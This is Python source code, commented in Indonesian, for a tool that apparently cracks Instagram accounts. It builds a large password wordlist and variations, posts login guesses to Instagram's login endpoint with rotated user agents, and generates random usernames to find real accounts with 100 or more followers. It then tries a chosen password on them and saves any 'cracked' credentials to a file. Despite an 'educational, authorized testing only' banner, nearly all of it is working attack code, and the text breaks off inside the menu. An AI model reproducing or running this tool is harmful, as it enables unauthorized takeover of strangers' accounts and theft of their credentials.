import requests
import random
import time
import string
from typing import List, Dict, Optional
from fake_useragent import UserAgent

class InstagramBruteforce:
    def __init__(self):
        self.login_url = "https://www.instagram.com/accounts/login/ajax/"
        self.ua = UserAgent()
        self.session = requests.Session()
        self.update_login_headers()
        
    def update_login_headers(self):
        """Update headers untuk login request"""
        self.login_headers = {
            'User-Agent': self.ua.random,
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Connection': 'keep-alive',
        }
    
    def generate_password_variations(self, username: str, base_wordlist: List[str] = None) -> List[str]:
        """Generate variasi password berdasarkan username dan wordlist"""
        if base_wordlist is None:
            base_wordlist = [
                # Password umum internasional
                'password', 'password123', '123456', '12345678', '123456789', 
                '12345', 'qwerty', 'abc123', '111111', 'admin', 'letmein',
                'welcome', 'monkey', 'password1', '123123', 'sunshine',
                'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1',
                
                # Kata cinta & romantis Indonesia
                'sayang', 'cinta', 'kasih', 'rindu', 'asmara', 'cintaku', 'sayangku',
                'kekasih', 'pacar', 'pujaan', 'cahaya', 'hati', 'jiwa', 'soulmate',
                'forever', 'selamanya', 'together', 'bersama', 'couple', 'pasangan',
                
                # Nama orang Indonesia umum
                'budi', 'sari', 'dewi', 'putri', 'ayu', 'lisa', 'maya', 'dian',
                'agus', 'adi', 'anto', 'andi', 'eko', 'yudi', 'rudi', 'dodi',
                'susi', 'rini', 'sinta', 'nina', 'mila', 'nita', 'tari', 'winda',
                'fitri', 'nurul', 'intan', 'amel', 'bunga', 'cantika', 'dinda',
                'ilham', 'reza', 'rian', 'david', 'kevin', 'ryan', 'aldo', 'rico',
                'dimas', 'rama', 'tomi', 'zaki', 'ferdi', 'hendra', 'indra',
                
                # Kota & daerah Indonesia
                'jakarta', 'bandung', 'surabaya', 'bali', 'jogja', 'yogyakarta',
                'semarang', 'medan', 'makassar', 'palembang', 'bogor', 'depok',
                'tangerang', 'bekasi', 'lombok', 'batam', 'pekanbaru', 'padang',
                'balikpapan', 'samarinda', 'manado', 'malang', 'solo', 'cirebon',
                'garut', 'tasik', 'cianjur', 'subang', 'purwakarta', 'cimahi',
                
                # Game & hiburan
                'garena', 'freefire', 'mobilelegends', 'pubg', 'valorant', 'minecraft',
                'roblox', 'dota', 'lol', 'genshin', 'aov', 'cod', 'ff', 'mlbb',
                'bebas', 'gratis', 'premium', 'vip', 'pro', 'legend', 'epic', 'mythic',
                
                # Tahun lahir & angka penting
                '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997',
                '1998', '1999', '2000', '2001', '2002', '2003', '2004', '2005',
                '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013',
                '1945', '170845', '081245', '131245', '123123', '112233', '121212',
                
                # Kata agama & spiritual
                'bismillah', 'allah', 'jesus', 'islam', 'muslim', 'kristen', 'hindu',
                'buddha', 'katolik', 'protestan', 'subhanallah', 'alhamdulillah',
                'astagfirullah', 'insyaallah', 'masyaallah', 'laillahaillallah',
                'muhammad', 'nabi', 'rasul', 'quran', 'injil', 'alkitab', 'bible',
                
                # Makanan & minuman Indonesia
                'nasigoreng', 'ayamgoreng', 'rendang', 'sate', 'bakso', 'mieayam',
                'gado', 'gadogado', 'ketoprak', 'lontong', 'sayur', 'soto', 'rawon',
                'eskrim', 'esteh', 'eskopi', 'jus', 'jeruk', 'apel', 'mangga', 'pisang',
                
                # Hobi & aktivitas
                'mancing', 'fishing', 'travel', 'jalan', 'makan', 'tidur', 'main',
                'nonton', 'baca', 'tulis', 'gambar', 'foto', 'video', 'musik',
                'nyanyi', 'dance', 'nari', 'olahraga', 'sepakbola', 'futsal',
                'badminton', 'basket', 'renang', 'lari', 'gym', 'fitnes',
                
                # Keluarga & hubungan
                'keluarga', 'family', 'ibu', 'bapak', 'ayah', 'mama', 'papa',
                'adik', 'kakak', 'abang', 'kaka', 'nenek', 'kakek', 'om', 'tante',
                'saudara', 'teman', 'sahabat', 'bestie', 'gebetan', 'mantan',
                
                # Sekolah & pendidikan
                'sekolah', 'kampus', 'kuliah', 'belajar', 'study', 'alumni',
                'murid', 'siswa', 'mahasiswa', 'dosen', 'guru', 'teacher',
                'university', 'college', 'campus', 'school', 'pelajar',
                
                # Pekerjaan & profesi
                'kerja', 'bekerja', 'office', 'karyawan', 'pegawai', 'staff',
                'manager', 'direktur', 'boss', 'pimpinan', 'wirausaha', 'bisnis',
                'usaha', 'entrepreneur', 'freelance', 'online', 'digital',
                
                # Kata sifat & emosi
                'bahagia', 'senang', 'gembira', 'sedih', 'marah', 'kesal',
                'cantik', 'ganteng', 'tampan', 'manis', 'imut', 'lucu',
                'baik', 'baikhati', 'jujur', 'setia', 'jahat', 'jahil',
                'pintar', 'pandai', 'cerdas', 'bodoh', 'malas', 'rajin',
                
                # Binatang & alam
                'kucing', 'anjing', 'burung', 'ikan', 'kelinci', 'hamster',
                'harimau', 'singa', 'gajah', 'kupu', 'kupu-kupu', 'merpati',
                'laut', 'gunung', 'pantai', 'hutan', 'sungai', 'danau',
                'matahari', 'bulan', 'bintang', 'langit', 'awan', 'hujan',
                
                # Teknologi & gadget
                'android', 'iphone', 'samsung', 'xiaomi', 'oppo', 'vivo',
                'realme', 'nokia', 'sony', 'laptop', 'komputer', 'pc',
                'internet', 'wifi', 'online', 'digital', 'smartphone',
                'hp', 'handphone', 'tablet', 'ipad', 'macbook',
                
                # Olahraga & tim
                'persib', 'persija', 'arema', 'persebaya', 'persik', 'persita',
                'barcelona', 'realmadrid', 'manchester', 'liverpool', 'chelsea',
                'arsenal', 'juventus', 'acmilan', 'inter', 'bayern', 'psg',
                
                # Musik & artis
                'sheila', 'agus', 'krisdayanti', 'rossa', 'judika', 'tulus',
                'afgan', 'isyana', 'raisa', 'virgoun', 'fiersa', 'ndx',
                'dmasiv', 'ungu', 'noah', 'slank', 'dewa', 'peterpan',
                'kangen', 'band', 'grup', 'musik', 'lagu', 'song',
                
                # Film & series
                'dilan', 'milea', 'ayatayatcinta', 'laskarpelangi', 'habibie',
                'warkop', 'susahsinyal', 'nanti', 'kapan', 'dulu', 'sekarang',
                'marvel', 'avengers', 'spiderman', 'batman', 'superman',
                'disney', 'netflix', 'youtube', 'tiktok', 'instagram',
                
                # Transportasi
                'motor', 'mobil', 'sepeda', 'pesawat', 'kereta', 'bus',
                'truck', 'truk', 'becak', 'ojek', 'grab', 'gojek',
                'traveloka', 'tiket', 'com', 'online', 'driver',
                
                # Fashion & style
                'baju', 'celana', 'sepatu', 'tas', 'topi', 'jaket',
                'kaos', 'kemeja', 'jeans', 'sneakers', 'sendal', 'sandal',
                'gucci', 'nike', 'adidas', 'puma', 'reebok', 'converse',
                'vans', 'skechers', 'zara', 'h&m', 'uniqlo', 'forever21',
                
                # Kata random populer
                'mantap', 'oke', 'yes', 'yess', 'yuk', 'ayo', 'hayuk',
                'capek', 'lelah', 'lapar', 'haus', 'ngantuk', 'pusing',
                'woles', 'santai', 'relax', 'cool', 'keren', 'awesome',
                'amazing', 'fantastic', 'great', 'good', 'nice', 'perfect',
                
                # Nama perusahaan & brand
                'google', 'facebook', 'twitter', 'whatsapp', 'telegram',
                'line', 'wechat', 'bca', 'mandiri', 'bri', 'bni',
                'indomaret', 'alfamaret', 'alfamidi', 'hypermart', 'carrefour',
                'lazada', 'tokopedia', 'shopee', 'bukalapak', 'blibli',
                
                # Hari & bulan
                'senin', 'selasa', 'rabu', 'kamis', 'jumat', 'sabtu', 'minggu',
                'januari', 'februari', 'maret', 'april', 'mei', 'juni', 'juli',
                'agustus', 'september', 'oktober', 'november', 'desember',
                
                # Warna
                'merah', 'kuning', 'hijau', 'biru', 'ungu', 'orange', 'pink',
                'hitam', 'putih', 'abu', 'abu-abu', 'coklat', 'emas', 'perak',
                'maroon', 'navy', 'teal', 'lime', 'cyan', 'magenta',
                
                # Angka kombinasi
                '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
                '111', '1111', '11111', '111111', '222', '2222', '22222', '222222',
                '333', '3333', '33333', '333333', '444', '4444', '44444', '444444',
                '555', '5555', '55555', '555555', '666', '6666', '66666', '666666',
                '777', '7777', '77777', '777777', '888', '8888', '88888', '888888',
                '999', '9999', '99999', '999999', '000', '0000', '00000', '000000',
                
                # Kata khusus Indonesia
                'merdeka', 'proklamasi', 'indonesia', 'indonesiaraya',
                'garuda', 'pancasila', 'bhineka', 'tunggal', 'ika',
                'nusantara', 'zamrud', 'khatulistiwa', 'gotong', 'royong',
                'pria', 'wanita', 'cowok', 'cewek', 'laki', 'perempuan',
                'jomblo', 'single', 'jones', 'galau', 'baper', 'alay',
                'gabut', 'mager', 'tobat', 'santuy', 'receh', 'gemoy',
                'kepo', 'lebay', 'norak', 'jadul', 'kekinian', 'update',
                'viral', 'trending', 'hits', 'populer', 'famous', 'seleb',
                'selebgram', 'youtuber', 'tiktoker', 'influencer', 'creator'
            ]
        
        password_variations = set()
        
        # Tambahkan base wordlist
        for word in base_wordlist:
            if word and len(word) >= 3:
                password_variations.add(word)
                password_variations.add(word + '123')
                password_variations.add(word + '1234')
                password_variations.add(word + '12345')
                password_variations.add(word + '123456')
                password_variations.add(word.capitalize())
                password_variations.add(word.upper())
                password_variations.add(word + '!')
                password_variations.add(word + '@')
                password_variations.add(word + '#')
                password_variations.add(word + '1')
                password_variations.add(word + '01')
                password_variations.add(word + '2020')
                password_variations.add(word + '2021')
                password_variations.add(word + '2022')
                password_variations.add(word + '2023')
                password_variations.add(word + '2024')
        
        if username:
            username_parts = username.lower().replace('_', ' ').replace('.', ' ').replace('-', ' ').split()
            
            for part in username_parts:
                if len(part) >= 3:
                    password_variations.add(part)
                    password_variations.add(part + '123')
                    password_variations.add(part + '1234')
                    password_variations.add(part + '12345')
                    password_variations.add(part + '123456')
                    password_variations.add(part.capitalize())
                    password_variations.add(part.upper())
                    password_variations.add(part + '!')
                    password_variations.add(part + '@')
                    password_variations.add(part + '1')
                    
                    for year in ['1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997',
                                '1998', '1999', '2000', '2001', '2002', '2003', '2004', '2005',
                                '2006', '2007', '2008', '2009', '2010', '2020', '2021', '2022', '2023', '2024']:
                        password_variations.add(part + year)
                        password_variations.add(part + '_' + year)
                        password_variations.add(year + part)
                        password_variations.add(part.capitalize() + year)
                    
                    popular_suffixes = ['sayang', 'cinta', 'ku', 'gue', 'aq', 'saya', 'aku', 'gw']
                    for suffix in popular_suffixes:
                        password_variations.add(part + suffix)
                        password_variations.add(suffix + part)
                    
                    for base_word in random.sample(base_wordlist, min(10, len(base_wordlist))):
                        if len(base_word) >= 3:
                            password_variations.add(part + base_word)
                            password_variations.add(base_word + part)
                            password_variations.add(part + '_' + base_word)
                            password_variations.add(base_word + '_' + part)
        
        for _ in range(30):
            password_variations.add(''.join(random.choices(string.digits, k=6)))
            password_variations.add(''.join(random.choices(string.digits, k=8)))
            password_variations.add(''.join(random.choices(string.digits, k=10)))
            
            simple_pass = ''.join(random.choices(string.ascii_lowercase, k=4)) + ''.join(random.choices(string.digits, k=2))
            password_variations.add(simple_pass)
            password_variations.add(simple_pass.capitalize())
            
            mixed_pass = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            password_variations.add(mixed_pass)
        
        password_list = [p for p in list(password_variations) if p and len(p) >= 3 and len(p) <= 20]
        
        # Random shuffle untuk variasi
        random.shuffle(password_list)
        
        return password_list[:150]  # Return lebih banyak password variations

    def attempt_login(self, username: str, password: str) -> Dict:
        """
        Attempt login ke Instagram dengan handle checkpoint
        """
        try:
            self.update_login_headers()
            
            self.session.get("https://www.instagram.com/accounts/login/", headers={
                'User-Agent': self.ua.random
            })
            
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'optIntoOneTap': 'false',
                'queryParams': '{}',
            }
            
            login_headers = self.login_headers.copy()
            if 'csrftoken' in self.session.cookies:
                login_headers['X-CSRFToken'] = self.session.cookies['csrftoken']
            
            response = self.session.post(
                self.login_url,
                data=login_data,
                headers=login_headers,
                timeout=10
            )
            
            result = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'success': False,
                'message': '',
                'checkpoint_required': False,
                'checkpoint_url': None
            }
            
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    
                    if response_data.get('authenticated'):
                        result['success'] = True
                        result['message'] = 'LOGIN SUCCESS!'
                        
                    elif response_data.get('user') and not response_data.get('authenticated'):
                        result['message'] = 'Wrong password'
                        
                    elif not response_data.get('user'):
                        result['message'] = 'Username not found'
                        
                    elif response_data.get('message') == 'checkpoint_required':
                        result['checkpoint_required'] = True
                        result['checkpoint_url'] = response_data.get('checkpoint_url')
                        result['message'] = 'CHECKPOINT_REQUIRED - Possible valid password'
                        
                    else:
                        result['message'] = response_data.get('message', 'Login failed')
                        
                except ValueError:
                    result['message'] = 'Invalid JSON response'
            
            return result
            
        except Exception as e:
            return {
                'username': username,
                'password': password,
                'status_code': 0,
                'success': False,
                'message': f'Error: {str(e)}',
                'checkpoint_required': False,
                'checkpoint_url': None
            }

class InstagramFollowersFinder(InstagramBruteforce):
    def __init__(self):
        super().__init__()
        self.graphql_url = "https://www.instagram.com/graphql/query/"
        self.public_url = "https://www.instagram.com/api/v1/users/web_profile_info/"
        self.ua = UserAgent()
        self.found_credentials = []
        self.checked_accounts = 0
        self.successful_cracks = 0
        
    def check_username_via_api(self, username: str) -> Dict:
        """
        Cek username menggunakan Instagram API v1
        """
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': f'https://www.instagram.com/{username}/',
                'Origin': 'https://www.instagram.com',
                'Connection': 'keep-alive',
            }
            
            params = {
                'username': username
            }
            
            response = self.session.get(
                self.public_url,
                params=params,
                headers=headers,
                timeout=10
            )
            
            print(f"   [+] API Response Status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    user_data = data.get('data', {}).get('user', {})
                    
                    if user_data:
                        followers = user_data.get('edge_followed_by', {}).get('count', 0)
                        following = user_data.get('edge_follow', {}).get('count', 0)
                        posts = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                        is_private = user_data.get('is_private', False)
                        is_verified = user_data.get('is_verified', False)
                        full_name = user_data.get('full_name', '')
                        
                        return {
                            'username': username,
                            'exists': True,
                            'followers': followers,
                            'following': following,
                            'posts': posts,
                            'is_private': is_private,
                            'is_verified': is_verified,
                            'full_name': full_name,
                            'method': 'api_v1'
                        }
                    else:
                        return {
                            'username': username,
                            'exists': False,
                            'error': 'User data not found in API response'
                        }
                        
                except ValueError as e:
                    return {
                        'username': username,
                        'exists': False,
                        'error': f'JSON decode error: {str(e)}'
                    }
                    
            elif response.status_code == 404:
                return {
                    'username': username,
                    'exists': False,
                    'error': 'User not found (404)'
                }
            elif response.status_code == 401:
                # Coba dengan headers yang berbeda
                return self.fallback_check_username(username)
            else:
                return {
                    'username': username,
                    'exists': False,
                    'error': f'HTTP {response.status_code}'
                }
                
        except Exception as e:
            return {
                'username': username,
                'exists': False,
                'error': str(e)
            }
    
    def fallback_check_username(self, username: str) -> Dict:
        """
        Fallback method jika API utama gagal
        """
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            response = self.session.get(
                f"https://www.instagram.com/{username}/",
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            
            if response.status_code == 200:
                # Parse HTML untuk mendapatkan data followers
                html_content = response.text
                import re
                
                followers = 0
                followers_patterns = [
                    r'"edge_followed_by":{"count":(\d+)}',
                    r'"followed_by":{"count":(\d+)}',
                    r'(\d+[\d,]*)\s*Followers',
                ]
                
                for pattern in followers_patterns:
                    matches = re.findall(pattern, html_content)
                    if matches:
                        try:
                            followers = int(matches[0].replace(',', ''))
                            break
                        except:
                            continue
                
                return {
                    'username': username,
                    'exists': True,
                    'followers': followers,
                    'following': 0,
                    'posts': 0,
                    'is_private': 'is_private' in html_content,
                    'is_verified': 'verified' in html_content,
                    'full_name': '',
                    'method': 'fallback_html'
                }
            else:
                return {
                    'username': username,
                    'exists': False,
                    'error': f'Fallback HTTP {response.status_code}'
                }
                
        except Exception as e:
            return {
                'username': username,
                'exists': False,
                'error': f'Fallback error: {str(e)}'
            }
    
    def generate_random_username(self, count: int = 10) -> List[str]:
        """Generate random usernames menggunakan nama orang asli"""
        usernames = []
        
        first_names_indonesia = [
            'adi', 'agus', 'ahmad', 'ali', 'andi', 'anto', 'ari', 'budi', 'doni', 'eka',
            'fajar', 'hadi', 'ilham', 'joko', 'luki', 'oki', 'rama', 'tomi', 'yudi', 'zaki',
            'bambang', 'joni', 'rudi', 'surya', 'dodi', 'eko', 'indra', 'toni', 'wawan', 'hendra',
            'ferdi', 'reza', 'rian', 'david', 'kevin', 'ryan', 'aldo', 'rico', 'dimas', 'rian',
            'ana', 'ayu', 'cici', 'dian', 'fitri', 'gita', 'lina', 'maya', 'nina', 'putri',
            'sari', 'umi', 'vina', 'wati', 'dewi', 'lisa', 'mila', 'nita', 'rara', 'sinta',
            'tari', 'winda', 'yuni', 'zahra', 'amel', 'bunga', 'cindy', 'dela', 'elsa', 'febri',
            'ghea', 'hani', 'intan', 'jihan', 'kartika', 'laila', 'mira', 'nurul', 'olivia', 'putri',
            'qonita', 'rini', 'salsa', 'tania', 'umi', 'vena', 'wulan', 'xena', 'yani', 'ziva',
            'aisyah', 'bella', 'cantika', 'dinda', 'elisa', 'fania', 'grace', 'halimah', 'indah', 'jasmine',
            'khalisa', 'lutfia', 'martha', 'nadine', 'oktavia', 'putri', 'qistina', 'rachel', 'sophia', 'tasya',
            'una', 'viola', 'widy', 'xyla', 'yulia', 'zahra', 'raditya', 'dika', 'awkarin', 'jessica', 
            'jane', 'raisa', 'ismail', 'marriott', 'attahalilintar', 'riaricis', 'bayuskakil', 'dodit',
            'mulyani', 'nikita', 'willy', 'gita', 'savira', 'deddy', 'corbuzier', 'sule', 'andrea', 
            'dian', 'astro', 'indonesia', 'narji', 'cimen', 'prilly', 'latuconsina', 'vanessa', 'angel', 
            'regina', 'ivan', 'gunawan', 'lesti', 'daun', 'purnama', 'rizky', 'febian', 'tiara',
            'andien', 'afgan', 'rossa', 'judika', 'tulus', 'isyan', 'reza'
        ]
        
        last_names = [
            'wijaya', 'santoso', 'kusuma', 'putra', 'sari', 'dewi', 'nugroho', 'halim',
            'pratama', 'wibowo', 'setiawan', 'gunawan', 'ramadan', 'hartono', 'siregar',
            'tanaka', 'chen', 'lee', 'wong', 'smith', 'johnson', 'brown', 'davis',
            'wilson', 'martinez', 'anderson', 'thomas', 'garcia', 'rodriguez',
            'yulianto', 'saputra', 'prabowo', 'subagio', 'kurniawan', 'siregar', 'nasution',
            'simbolon', 'sihombing', 'manullang', 'sitompul', 'lubis', 'hasibuan', 'tanjung',
            'hutagalung', 'pane', 'sitorus', 'marpaung', 'nainggolan', 'sembiring', 'sinaga',
            'pangestu', 'maulana', 'firmansyah', 'hermawan', 'susanto', 'zakaria', 'rahman',
            'hidayat', 'prasetyo', 'suryanto', 'kusdianto', 'lim', 'wang', 'zhang', 'liu',
            'kim', 'park', 'jung', 'yamamoto', 'sato', 'suzuki', 'takahashi', 'kobayashi',
            'nguyen', 'tran', 'le', 'pham', 'vo', 'huynh'
        ]
        
        common_words = [
            'official', 'real', 'my', 'our', 'world', 'life', 'story', 'journey', 
            'daily', 'moment', 'memory', 'love', 'dream', 'hope', 'faith', 'star',
            'cool', 'awesome', 'amazing', 'fantastic', 'great', 'best', 'top',
            'art', 'photo', 'picture', 'video', 'music', 'travel', 'food', 'fashion',
            'beauty', 'style', 'vlog', 'blog', 'channel', 'page', 'account', 'profile',
            'indonesia', 'jkt', 'bdg', 'sby', 'jogja', 'bali', 'medan', 'makassar',
            'bandung', 'surabaya', 'jakarta', 'yogyakarta', 'semarang', 'palembang',
            'family', 'friends', 'team', 'squad', 'crew', 'community', 'group'
        ]
        
        patterns = [
            lambda: f"{random.choice(first_names_indonesia)}_{random.choice(last_names)}",
            lambda: f"{random.choice(first_names_indonesia)}.{random.choice(last_names)}",
            lambda: f"{random.choice(first_names_indonesia)}{random.choice(last_names)}",
            lambda: f"{random.choice(first_names_indonesia)}{random.randint(1, 999)}",
            lambda: f"{random.choice(first_names_indonesia)}{random.randint(80, 2000)}",
            lambda: f"{random.choice(common_words)}{random.randint(100, 9999)}",
            lambda: f"{random.choice(common_words)}_{random.choice(common_words)}",
        ]
        
        generated_count = 0
        max_attempts = count * 20
        
        while generated_count < count and len(usernames) < count and max_attempts > 0:
            try:
                pattern = random.choice(patterns)
                username = pattern()
                
                if username:
                    username = (
                        username.lower()
                        .replace(' ', '')
                        .replace("'", "")
                        .replace('"', '')
                        .replace('-', '')[:15]
                    )
                    
                    if (len(username) >= 4 and 
                        not username.startswith(('0', '1', '2', '3', '4', '5', '6', '7', '8', '9')) and
                        not username.endswith(('_', '.', '-')) and
                        username not in usernames):
                        usernames.append(username)
                        generated_count += 1
                
                max_attempts -= 1
                
            except Exception:
                max_attempts -= 1
                continue
        
        return usernames[:count]
    
    def bruteforce_account_with_password(self, username: str, password: str, followers: int) -> Dict:
        """
        Bruteforce akun dengan password manual yang diinput user
        """
        print(f"\n[+] Starting bruteforce for: @{username}")
        print(f"[+] Followers: {followers:,}")
        print(f"[+] Using manual password: {password}")
        
        result = self.attempt_login(username, password)
        
        if result['success']:
            print(f"   [+] SUCCESS! Password found: {password}")
            
            credential = {
                'username': username,
                'password': password,
                'followers': followers,
                'attempts': 1
            }
            self.found_credentials.append(credential)
            self.successful_cracks += 1
            
            # Auto save ke file
            self.save_credentials_to_file()
            
            return {
                'username': username,
                'followers': followers,
                'success': True,
                'password': password,
                'attempts': 1
            }
        elif result['checkpoint_required']:
            print(f"   [!] CHECKPOINT REQUIRED - Password mungkin benar: {password}")
            print(f"   [!] Checkpoint URL: {result['checkpoint_url']}")
            
            # Simpan sebagai potential success
            credential = {
                'username': username,
                'password': password,
                'followers': followers,
                'attempts': 1,
                'checkpoint': True,
                'checkpoint_url': result['checkpoint_url']
            }
            self.found_credentials.append(credential)
            self.save_credentials_to_file()
            
            return {
                'username': username,
                'followers': followers,
                'success': True,  # Anggap berhasil karena checkpoint
                'password': password,
                'attempts': 1,
                'checkpoint': True
            }
        else:
            print(f"   [!] Login failed: {result['message']}")
            return {
                'username': username,
                'followers': followers,
                'success': False,
                'password': None,
                'attempts': 1
            }
    
    def save_credentials_to_file(self):
        """Auto save credentials yang berhasil ke file"""
        filename = "ress_akun_ig.txt"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=== CRACKED INSTAGRAM ACCOUNTS ===\n")
                f.write(f"Generated on: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n\n")
                
                for i, cred in enumerate(self.found_credentials, 1):
                    f.write(f"ACCOUNT #{i}\n")
                    f.write(f"Username: {cred.get('username', 'N/A')}\n")
                    f.write(f"Password: {cred.get('password', 'N/A')}\n")
                    f.write(f"Followers: {cred.get('followers', 0):,}\n")
                    f.write(f"Attempts: {cred.get('attempts', 0)}\n")
                    
                    if cred.get('checkpoint'):
                        f.write(f"Status: CHECKPOINT REQUIRED\n")
                        f.write(f"Checkpoint URL: {cred.get('checkpoint_url', 'N/A')}\n")
                    else:
                        f.write("Status: SUCCESS\n")
                    
                    f.write("-" * 30 + "\n")
            
            print(f"\n[+] Credentials automatically saved to: {filename}")
        except Exception as e:
            print(f"[!] Error saving credentials: {e}")
    
    def find_and_bruteforce_with_manual_password(self, manual_password: str, delay: float = 5.0):
        """
        Cari akun dan bruteforce dengan password manual
        Hanya target akun dengan followers >= 100
        """
        print("[+] Starting Instagram Account Finder with Manual Password")
        print("=" * 60)
        print("[+] MODE: MANUAL PASSWORD")
        print(f"[+] PASSWORD: {manual_password}")
        print("[+] TARGET: Accounts with 100+ followers only")
        print("[+] METHOD: Instagram API v1")
        print(f"[+] Delay: {delay} seconds between requests")
        print("=" * 60)
        
        consecutive_errors = 0
        max_consecutive_errors = 5
        
        while True:
            try:
                # Generate 1 username untuk dicek
                usernames = self.generate_random_username(1)
                if not usernames:
                    print("[!] Failed to generate username, retrying...")
                    time.sleep(delay)
                    continue
                
                username = usernames[0]
                self.checked_accounts += 1
                
                print(f"\n[+] Checking: {username} (Total checked: {self.checked_accounts})")
                
                # Gunakan metode API
                result = self.check_username_via_api(username)
                
                if result.get('exists'):
                    followers = result.get('followers', 0)
                    
                    # TAMPILKAN SEMUA USERNAME YANG AVAILABLE BESERTA FOLLOWERSNYA
                    print(f"   [+] USER EXISTS | Followers: {followers:,} | Following: {result.get('following', 0):,}")
                    print(f"   [+] Posts: {result.get('posts', 0):,} | Private: {result.get('is_private', False)} | Verified: {result.get('is_verified', False)}")
                    print(f"   [+] Method: {result.get('method', 'unknown')}")
                    
                    # HANYA proses akun dengan followers >= 100
                    if followers >= 100:
                        status = "[+] TARGET FOUND"
                        if followers > 10000:
                            status += " [+] VIRAL ACCOUNT"
                        elif followers > 1000:
                            status += " [+] POPULAR ACCOUNT"
                        elif followers > 500:
                            status += " [+] GROWING ACCOUNT"
                        else:
                            status += " [+] SMALL ACCOUNT"
                        
                        print(f"   {status} | Followers: {followers:,}")
                        
                        # Bruteforce akun target dengan password manual
                        bruteforce_result = self.bruteforce_account_with_password(
                            username, 
                            manual_password,
                            followers
                        )
                        
                        consecutive_errors = 0  # Reset error counter
                        
                        # Jika berhasil crack
                        if bruteforce_result['success']:
                            print("\n" + "=" * 60)
                            print("[+] SUCCESSFUL CRACK! Account compromised!")
                            print(f"[+] Username: @{username}")
                            print(f"[+] Password: {manual_password}")
                            print(f"[+] Followers: {followers:,}")
                            print("=" * 60)
                            
                            # Tanya user apakah ingin lanjut
                            while True:
                                choice = input("\n[?] Continue searching for more accounts? (y/n): ").lower().strip()
                                if choice in ['y', 'yes', '']:
                                    print("[+] Continuing search...")
                                    break
                                elif choice in ['n', 'no']:
                                    print("[+] Stopping search as requested.")
                                    self.generate_final_report()
                                    return
                                else:
                                    print("[!] Please enter 'y' for yes or 'n' for no")
                    else:
                        print(f"   [+] SKIPPED - Only {followers} followers (need 100+)")
                        consecutive_errors = 0
                else:
                    print(f"   [+] Not exists or error: {result.get('error', 'Unknown')}")
                    consecutive_errors += 1
                
                # Jika terlalu banyak error berturut-turut, tunggu lebih lama
                if consecutive_errors >= max_consecutive_errors:
                    wait_time = delay * 3
                    print(f"\n[!] Too many consecutive errors, waiting {wait_time} seconds...")
                    time.sleep(wait_time)
                    consecutive_errors = 0
                
                # Delay untuk menghormati rate limiting
                time.sleep(delay)
                
                # Tampilkan progress setiap 10 akun
                if self.checked_accounts % 10 == 0:
                    print(f"\n[+] Progress: {self.checked_accounts} accounts checked")
                    print(f"[+] Successful cracks: {self.successful_cracks}")
                    
            except KeyboardInterrupt:
                print("\n[+] Search interrupted by user")
                self.generate_final_report()
                return
            except Exception as e:
                print(f"[!] Error occurred: {e}")
                consecutive_errors += 1
                time.sleep(delay)
                continue
    
    def generate_final_report(self):
        """Generate laporan final"""
        print("\n" + "=" * 70)
        print("[+] FINAL REPORT - MANUAL PASSWORD BRUTEFORCE")
        print("=" * 70)
        
        print(f"[+] Total accounts checked: {self.checked_accounts}")
        print(f"[+] Successful cracks: {self.successful_cracks}")
        
        if self.found_credentials:
            print(f"\n[+] CRACKED ACCOUNTS: {len(self.found_credentials)}")
            print("-" * 50)
            
            for i, cred in enumerate(self.found_credentials, 1):
                print(f"\n#{i} [+] CRACKED ACCOUNT")
                print(f"   [+] Username: @{cred.get('username', 'N/A')}")
                print(f"   [+] Password: {cred.get('password', 'N/A')}")
                print(f"   [+] Followers: {cred.get('followers', 0):,}")
                print(f"   [+] Attempts: {cred.get('attempts', 0)}")
                
                if cred.get('checkpoint'):
                    print(f"   [+] Status: CHECKPOINT REQUIRED")
                    print(f"   [+] Checkpoint URL: {cred.get('checkpoint_url', 'N/A')}")
                else:
                    print(f"   [+] Status: SUCCESS")
        
        if self.successful_cracks > 0:
            success_rate = (self.successful_cracks / self.checked_accounts) * 100
            print(f"\n[+] Overall success rate: {success_rate:.2f}%")
        else:
            print(f"\n[+] No accounts were successfully cracked")

def main_menu():
    """CREATE BY PRAWIRA REXSA AND MY FRIEND DEEPSEEK GPT"""
    print("[+] EDUCATIONAL TOOL - FOR AUTHORIZED TESTING ONLY")
    print("[+] WARNING: This tool is for educational purposes only")
    print("[+] TOOLS CRACKER INSTAGRAM VIA MATCHING PASSWORD INPUT")
    
    
    print("[+] SELECT MODE:")
    print("1. Manual Password Mode (Input password manual)")
    print("2. Wordlist Mode (Generate password variations)")
    
    while True:
        choice = input("\n[?] Choose mode (1/2): ").strip()
        
        if choice == '1':
            manual_password = input("[?] Enter manual password: ").strip()
            if not manual_password:
                print("[!] Password cannot be empty!")
                continue
            
            print(f"\n[+] Using manual password: {manual_password}")
